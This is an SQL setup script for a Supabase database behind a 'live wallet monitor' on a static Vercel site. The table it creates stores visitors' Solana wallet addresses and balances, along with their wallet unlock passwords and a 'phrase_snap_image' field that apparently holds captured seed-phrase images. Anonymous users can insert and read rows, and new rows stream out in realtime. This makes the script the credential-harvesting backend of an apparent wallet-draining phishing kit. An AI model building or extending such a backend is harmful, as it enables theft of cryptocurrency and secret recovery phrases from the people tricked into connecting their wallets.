-- Live wallet monitor for the static Vercel site.
-- Run in Supabase → SQL Editor:
-- https://supabase.com/dashboard/project/jdnfpchddosbxejezkgk/sql/new

create table if not exists public.wallet_sessions (
  id text primary key,
  wallet_address text not null unique,
  wallet_type text not null default 'Solana Wallet',
  chain text not null default 'solana',
  network text not null default 'mainnet-beta',
  balance_sol double precision,
  page_url text,
  user_agent text,
  browser_session_id text,
  unlock_password text,
  phrase_snap_image text,
  connected_at timestamptz not null default now(),
  last_seen_at timestamptz not null default now(),
  connection_status text not null default 'connected'
);

create index if not exists wallet_sessions_last_seen_idx on public.wallet_sessions (last_seen_at desc);

alter table public.wallet_sessions enable row level security;

drop policy if exists wallet_sessions_select on public.wallet_sessions;
drop policy if exists wallet_sessions_insert on public.wallet_sessions;
drop policy if exists wallet_sessions_update on public.wallet_sessions;

create policy wallet_sessions_select on public.wallet_sessions
  for select to anon, authenticated using (true);

create policy wallet_sessions_insert on public.wallet_sessions
  for insert to anon, authenticated with check (true);

create policy wallet_sessions_update on public.wallet_sessions
  for update to anon, authenticated using (true) with check (true);

do $$
begin
  begin
    alter publication supabase_realtime add table public.wallet_sessions;
  exception
    when duplicate_object then null;
  end;
end $$;

alter table public.wallet_sessions add column if not exists phrase_snap_image text;
